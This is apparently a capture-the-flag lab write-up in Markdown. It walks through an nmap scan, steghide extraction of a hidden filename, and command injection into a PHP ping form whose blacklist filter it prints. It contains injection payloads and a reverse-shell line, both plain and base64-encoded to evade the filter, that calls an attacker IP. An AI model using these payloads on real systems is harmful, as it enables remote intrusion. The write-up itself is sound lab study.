

# NMAP

```bash
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).

```

--> ![image](https://user-images.githubusercontent.com/68326057/117526504-47161a80-afe3-11eb-8c43-41373811da52.png)

# Stegnography

![image](https://user-images.githubusercontent.com/68326057/117526646-3d40e700-afe4-11eb-988d-db8f0f51b471.png)


```bash
steghide --extract -sf hacklabs.jpeg
passphrase: harder
```

![image](https://user-images.githubusercontent.com/68326057/117526702-682b3b00-afe4-11eb-92f2-4536b946ecc2.png)

```bash
cat imp.txt
c3VwZXJhZG1pbi5waHA=
```

```bash
echo "c3VwZXJhZG1pbi5waHA=" | base64 -d
superadmin.php
```


## TEST - 1

![image](https://user-images.githubusercontent.com/68326057/117527047-9ad63300-afe6-11eb-8bb4-cc12dbe47e09.png)

## TEST - 2

![image](https://user-images.githubusercontent.com/68326057/117527054-b0e3f380-afe6-11eb-9901-f02412ef67b7.png)

## TEST -3

![image](https://user-images.githubusercontent.com/68326057/117527080-edafea80-afe6-11eb-87d9-3ad589f92239.png)

FAILED

## TEST -4

```bash
pinger=127.0.0.1 | bash -c 'cat superadmin.php'&submitt=Submit+Query

```

```php
form method="post" action="">
<input type="text" placeholder="Enter an IP to ping" name="pinger">
<br>
<input type="submit" name="submitt">
</form>

<pre><form method="post" action="">
<input type="text" placeholder="Enter an IP to ping" name="pinger">
<br>
<input type="submit" name="submitt">
</form>

<?php
   if (isset($_POST['submitt']))
{
   	$word=array(";","&&","/","bin","&"," &&","ls","nc","dir","pwd");
   	$pinged=$_POST['pinger'];
   	$newStr = str_replace($word, "", $pinged);
   	if(strcmp($pinged, $newStr) == 0)
		{
		    $flag=1;
		}
       else
		{
		   $flag=0;
		}
}

if ($flag==1){
$outer=shell_exec("ping -c 3 $pinged");
echo "<pre>$outer</pre>";
}
?>


</pre>

```


--> After Reading thhe code realised 

![image](https://user-images.githubusercontent.com/68326057/117528051-e2ac8880-afed-11eb-892a-c5d10374fd24.png)

![image](https://user-images.githubusercontent.com/68326057/117528531-65364780-aff0-11eb-8235-a93b2c876fd8.png)

![image](https://user-images.githubusercontent.com/68326057/117528541-6bc4bf00-aff0-11eb-8c04-6300faa4a0af.png)

BUT I can do nothing ;_;

127.0.0.1 | bash -c 'n\c -c bash 192.168.49.140 1234'


```bash

base64 decoding it

nc.traditional -e /bin/bash 192.168.49.140 4444

127.0.0.1 | `echo bmMudHJhZGl0aW9uYWwgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNDkuMTQwIDQ0NDQ= | base64 -d`
```

# USER  - wwwdata


## USERS

```
root:x:0:0:root:/root:/bin/bash
haclabs:x:1000:1000:haclabs,,,:/home/haclabs:/bin/bash
yash:x:1001:1001:,,,:/home/yash:/bin/bash
```

![image](https://user-images.githubusercontent.com/68326057/117529331-a597c480-aff4-11eb-9f97-4d2849c5dfb2.png)

![image](https://user-images.githubusercontent.com/68326057/117529328-a16ba700-aff4-11eb-9595-9a376387ee68.png)

# ROOT


![image](https://user-images.githubusercontent.com/68326057/117529342-bd6f4880-aff4-11eb-827f-23063a358e1b.png)
